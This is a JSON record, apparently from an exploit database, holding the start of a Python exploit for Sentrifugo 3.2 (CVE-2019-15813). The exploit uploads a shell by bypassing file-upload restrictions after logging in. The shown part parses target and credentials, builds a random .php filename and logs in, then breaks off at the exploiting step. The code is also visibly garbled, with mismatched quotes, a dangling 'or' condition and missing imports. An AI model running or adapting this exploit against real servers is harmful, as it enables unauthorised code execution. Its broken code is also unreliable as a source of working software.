{
    "text": "vul_name : Sentrifugo 3.2 Shell Upload / Restriction Bypass ， vul_cve : CVE-2019-15813 ， vul_poc :  # Exploit Title : Sentrifugo 3.2 - File Upload Restriction Bypass ( Authenticated )  ，  # Date : 26/10/2020 ，  # Exploit Author : Gurkirat Singh <tbhaxor @ gmail.com> ，  # Vendor Homepage :  ，  # POC Link :  ，  # Version : 3.2 ，  # Tested on : Linux and Windows ，  # CVE : CVE-2019-15813 ，  # Contact Details :  ， from argparse import ArgumentParser , RawTextHelpFormatter ， from bs4 import BeautifulSoup , Tag ， from requests.sessions import Session ， from huepy import *  ， parser = ArgumentParser ( description=\"Exploit for CVE-2019-15813\" ,  ， formatter_class=RawTextHelpFormatter )  ， parser.add_argument ( \"-target\" ,  ， \"-t\" ,  ， help=\"target uri where application is installed\" ,  ， required=True ,  ， metavar=\" ,  ， dest=\"t\" )  ， parser.add_argument ( \"-user\" ,  ， \"-u\" ,  ， help=\"username to authenticate\" ,  ， required=True ,  ， metavar=\" ,  ， dest=\"u\" )  ， parser.add_argument ( \"-password\" ,  ， \"-p\" ,  ， help=\"password to authenticate\" ,  ， required=True ,  ， metavar=\" ,  ， dest=\"p\" )  ， args = parser.parse_args (  )  ， args.t = args.t [  : -1 ]  ， F = \".join ( random.choices ( string.ascii_letters , k=13 ) + \".php\" ， with Session (  ) as http :  ， print ( run ( \"Logging in\" )  ， data = {\"username\" : args.u , \"password\" : args.p} ， r = http.post ( args.t + \"/index.php/index/loginpopupsave\" ,  ， data=data ,  ， allow_redirects=False )  ， or r.headers.get ( \"Location\" , \" ) .endswith ( \"welcome/\" )  :  ， print ( bad ( \"Unable to login. Check username / password\" )  ， exit ( 1 )  ， print ( good ( \"Logged in\" )  ， print ( run ( \"Exploiting\" ) ",
    "time": "2020.10.27"
}